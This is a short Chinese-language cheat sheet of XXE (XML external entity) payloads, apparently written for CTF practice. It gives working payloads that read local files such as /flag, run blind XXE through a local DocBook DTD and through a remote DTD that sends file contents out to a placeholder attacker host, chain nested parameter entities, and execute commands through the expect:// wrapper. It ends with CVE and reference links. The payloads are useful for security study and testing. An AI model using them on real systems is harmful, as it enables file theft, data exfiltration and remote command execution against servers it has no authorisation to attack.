# XXE

## 外部实体 (libxml < 2.90)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///flag">
 ]>

 <userInfo>
  <name>&xxe;</name>
 </userInfo>
```


## Blind-XXE 引用本地DTD

利用 ISOamsa

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///flag">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
'>
    %local_dtd;
]
```

## Blind-XXE 引用外部DTD

XML payload

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "http://<attacker-ip>/a.dtd">  
    <!ENTITY % file SYSTEM "file:///flag">
    %remote;
    %send;
]>
<message>eki</message>
```

DTD payload

```xml
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://attacker-ip?%file;'>">
%start;
```


## 嵌套参数实体

```
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ELEMENT message ANY>
    <!ENTITY % para1 SYSTEM "file:///flag">
    <!ENTITY % para '
        <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">
        &#x25;para2;
    '>
    %para;
]>
<message>eki</message>
```

## except:// PHP扩展协议协议RCE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "expect://id">
 ]>

 <userInfo>
  <name>&xxe;</name>
 </userInfo>
```

## 相关cve

- CVE-2014-3529 apache poi < 3.10.1 https://xz.aliyun.com/t/6996#toc-3

- CVE-2019-12415 https://b1ue.cn/archives/241.html


## 参考资料

一篇文章带你深入理解漏洞之 XXE 漏洞

https://xz.aliyun.com/t/3357

Blind XXE详解与Google CTF一道题分析 

https://www.freebuf.com/vuls/207639.html

DTD Cheat Sheet 

https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html